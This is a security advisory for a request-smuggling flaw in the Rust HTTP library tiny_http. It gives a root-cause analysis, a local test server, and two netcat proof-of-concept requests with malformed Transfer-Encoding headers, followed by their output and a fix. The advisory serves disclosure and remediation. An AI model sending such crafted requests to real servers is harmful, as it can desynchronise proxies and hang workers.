# Security Advisory: HTTP Request Smuggling via Unparsed Transfer-Encoding Values (tiny_http)

**Assigned CVE ID:** CVE-2026-66752

## Summary

tiny_http checks only whether a `Transfer-Encoding` header is present. It never
looks at the value. Any value, including codings that are not `chunked` and
coding lists whose final element is not `chunked`, causes the body to be
chunk-decoded, and `Content-Length` is discarded at the same time.

A front end that parses the transfer coding correctly will frame such a request
differently from tiny_http. Two participants with two framings on one connection
is the precondition for request smuggling. Sending a non-chunked body with a
non-chunked coding also makes tiny_http fail the body read and answer nothing at
all.

## Affected versions

Repo URL: https://github.com/tiny-http/tiny-http

| | |
|---|---|
| Affected | all released versions up to and including 0.12.0 (2022-10-06), the current release |
| Verified | 0.6.2, 0.6.3, 0.8.0, 0.9.0, 0.10.0, 0.11.0, 0.12.0 |
| Fixed in | no fixed version at time of writing |

## Severity

CWE-444 (Inconsistent Interpretation of HTTP Requests).

CVSS 4.0 base score 6.3 (Medium)
`CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:L/SI:L/SA:N`

## Threat model

A remote, unauthenticated client sending raw HTTP. No credentials or user
interaction.

The smuggling case requires tiny_http to sit behind a front end or CDN that
forwards `Transfer-Encoding` and `Content-Length` and applies RFC 9112 section
6.1 correctly, meaning it treats a coding list whose final element is not
`chunked` as not chunked and falls back to `Content-Length`. That front end and
tiny_http then disagree about where the body ends.

The unanswered-request case needs nothing beyond the ability to connect.

## Root cause

`tiny_http-0.12.0/src/request.rs`, lines 143 to 153. The header is located and
cloned, but the value is only ever tested for presence:

```rust
143      // finding the transfer-encoding header
144      let transfer_encoding = headers
145          .iter()
146          .find(|h: &&Header| h.field.equiv("Transfer-Encoding"))
147          .map(|h| h.value.clone());
148  
149      // finding the content-length header
150      let content_length = if transfer_encoding.is_some() {
151          // if transfer-encoding is specified, the Content-Length
152          // header must be ignored (RFC2616 #4.4)
153          None
```

`tiny_http-0.12.0/src/request.rs`, lines 218 to 221, then applies the chunked
decoder unconditionally:

```rust
218      } else if transfer_encoding.is_some() {
219          // if a transfer-encoding was specified, then "chunked" is ALWAYS applied
220          // over the message (RFC2616 #3.6)
221          Box::new(FusedReader::new(Decoder::new(source_data))) as Box<dyn Read + Send + 'static>
```

`transfer_encoding` is an `Option<AsciiString>` holding the raw value, and
nothing ever inspects its contents. RFC 9112 section 6.1 requires the final
coding of a request to be `chunked` and requires a server to reject the message
otherwise, and section 6.3 requires rejecting a request that carries both
`Transfer-Encoding` and `Content-Length`.

## Proof of Concept

Step 1. Start a server that reports the framing headers and the body it read.

```rust
use std::io::Read;
use tiny_http::{Response, Server};

fn main() {
    let server = Server::http("127.0.0.1:8005").unwrap();
    for mut request in server.incoming_requests() {
        let te = request.headers().iter()
            .find(|h| h.field.equiv("Transfer-Encoding"))
            .map(|h| h.value.as_str().to_string());
        let cl = request.headers().iter()
            .find(|h| h.field.equiv("Content-Length"))
            .map(|h| h.value.as_str().to_string());
        let mut body = Vec::new();
        let r = request.as_reader().read_to_end(&mut body);
        println!("TE={:?} CL={:?} read={:?} body={:?}",
                 te, cl, r, String::from_utf8_lossy(&body));
        let _ = request.respond(Response::from_string("ok"));
    }
}
```

Step 2. Send a request with `Transfer-Encoding: identity`, a matching
`Content-Length`, and a plain body. Any front end would frame this body as the
five bytes `hello`.

```sh
printf 'POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: identity\r\nContent-Length: 5\r\n\r\nhello' | nc -w 2 127.0.0.1 8005
```

Result. tiny_http chunk-decoded a body that is not chunked, dropped it, and sent
no response. The client waits until its own timeout and the connection is
consumed.

```
TE=Some("identity") CL=Some("5") read=Err(Custom { kind: InvalidInput, error: DecoderError }) body=""
```

Step 3. Send a coding list whose final element is not `chunked`.

```sh
printf 'POST / HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked, identity\r\n\r\n5\r\nhello\r\n0\r\n\r\n' | nc -w 2 127.0.0.1 8005
```

Result. tiny_http accepts it and decodes as chunked, where RFC 9112 section 6.1
requires rejection:

```
TE=Some("chunked, identity") CL=None read=Ok(5) body="hello"
```

For contrast, `Content-Length` alone and a correct `Transfer-Encoding: chunked`
both behave properly and yield `body="hello"`.

## Impact

Where tiny_http sits behind a front end that parses transfer codings correctly,
the two components disagree about where the request body ends. The attacker
chooses the bytes on either side of that disagreement, which is the standard
setup for smuggling a request past the front end's routing and access control.

Independently of any front end, steps 2 and 3 show a trivially malformed request
that ties up a worker and receives no response at all, so the client cannot tell
the request was rejected.

## Remediation

Parse `Transfer-Encoding` as the comma-separated list that it is, in
`src/request.rs` around line 144:

Require the final coding to be `chunked` for a request carrying a body, and
reject any other coding with 400 rather than chunk-decoding it. Reject a request
that carries both `Transfer-Encoding` and `Content-Length`, as RFC 9112 section
6.3 requires for a server that is not a proxy, instead of silently ignoring
`Content-Length` at line 150.

When the body reader fails, send a 400 rather than dropping the request without
a response.
